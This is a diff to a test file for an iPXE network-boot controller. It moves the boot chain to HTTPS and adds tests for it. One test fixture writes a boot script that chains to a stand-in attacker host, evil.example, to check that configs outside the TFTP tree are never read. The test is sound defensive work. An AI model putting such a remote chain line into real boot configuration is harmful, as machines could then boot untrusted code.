@@ -13,12 +13,14 @@ dhcp-boot=tag:ipxe,boot.ipxe
 
 BOOT_IPXE = """\
 #!ipxe
-chain --autofree boot.ipxe.cfg ||
+set https-port 443
+chain --autofree https://${next-server}:${https-port}/tftp/boot.ipxe.cfg ||
 chain --replace --autofree ${menu-url} ||
 """
 
 BOOT_CFG = """\
 #!ipxe
+set https-port 443
 set https-url https://${controller_ip}:${https-port}/
 set chain-url ${https-url}file
 set menu-url ${https-url}tftp/menu.ipxe
@@ -136,6 +138,33 @@ def test_escaping_paths_are_rejected_and_never_read(tmp_path):
     chain = {item["file"]: item["status"] for item in data["stage2"]}
     assert chain == {"boot.ipxe": "ok", "../outside.cfg": "rejected"}
     assert data["menu"] == {"status": "unavailable", "items": 0}
+
+
+def test_config_url_outside_tftp_is_not_read(tmp_path):
+    conf, tftp = _tree(tmp_path)
+    (tftp / "boot.ipxe").write_text(
+        "#!ipxe\nchain --autofree https://evil.example/other.cfg ||\n",
+        encoding="utf-8",
+    )
+
+    data = boot_assets.inventory(conf, tftp)
+    assert {item["file"] for item in data["stage2"]} == {"boot.ipxe"}
+    assert data["menu"] == {"status": "unavailable", "items": 0}
+
+
+def test_repo_boot_chain_keeps_tftp_to_pointer():
+    root = Path(__file__).resolve().parents[2]
+    boot = (root / "tftp/boot.ipxe").read_text(encoding="utf-8")
+    cfg = (root / "tftp/boot.ipxe.cfg").read_text(encoding="utf-8")
+    boot_code = "\n".join(line.split("#", 1)[0] for line in boot.splitlines())
+    cfg_code = "\n".join(line.split("#", 1)[0] for line in cfg.splitlines())
+
+    assert "tftp://" not in boot_code
+    assert "https://${next-server}:${https-port}/tftp/boot.ipxe.cfg" in boot_code
+    assert "boot-url" not in cfg_code
+    assert "boot-dir" not in cfg_code
+    assert "set https-port 443" in boot_code
+    assert "set https-port 443" in cfg_code
 
 
 def test_boot_assets_endpoint(tmp_path, client, auth_headers, monkeypatch):
